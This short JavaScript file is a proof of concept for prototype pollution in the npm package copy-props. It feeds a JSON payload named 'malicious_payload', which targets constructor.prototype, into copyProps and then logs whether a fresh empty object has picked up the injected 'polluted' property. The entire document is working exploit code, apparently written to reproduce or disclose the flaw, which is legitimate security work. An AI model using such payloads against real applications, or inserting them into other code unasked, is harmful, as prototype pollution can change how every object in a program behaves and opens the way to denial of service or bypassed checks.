var obj = {};
obj.__proto__.polluted = undefined;
Object.defineProperty(obj, '__proto__', {
    value: obj.__proto__,
    writable: true,
    enumerable: true,
    configurable: true
});
console.log({}.polluted);
const copyProps = require('copy-props');
const malicious_payload = '{"constructor": {"prototype": {"polluted":"yes"}}}';
copyProps(JSON.parse(malicious_payload), obj);
console.log({}.polluted);